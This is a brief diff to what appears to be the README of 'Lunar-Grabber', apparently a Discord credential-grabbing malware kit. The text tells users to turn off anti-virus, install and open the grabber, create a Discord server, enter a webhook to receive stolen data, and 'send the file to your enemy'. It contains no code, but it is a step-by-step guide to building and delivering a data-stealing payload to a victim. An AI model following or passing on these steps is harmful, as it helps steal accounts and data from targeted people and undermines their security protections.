@@ -11,3 +11,12 @@ MAKE SURE TO CLEAN
 MAKE SURE TO TURN YOUR ANTI-VIRUS OFF ENJOY!
 
 PERM Grabber TEMP Grabber
+
+
+1. |Turn Off anti-virus|
+2. |Open Lunar-SetUp|
+3. |Weit for it to install|
+4. |Open Lunar-Grabber|
+5. |Make a discord server|
+6. |Enter the webhook|
+7. |send the file to your enemy|
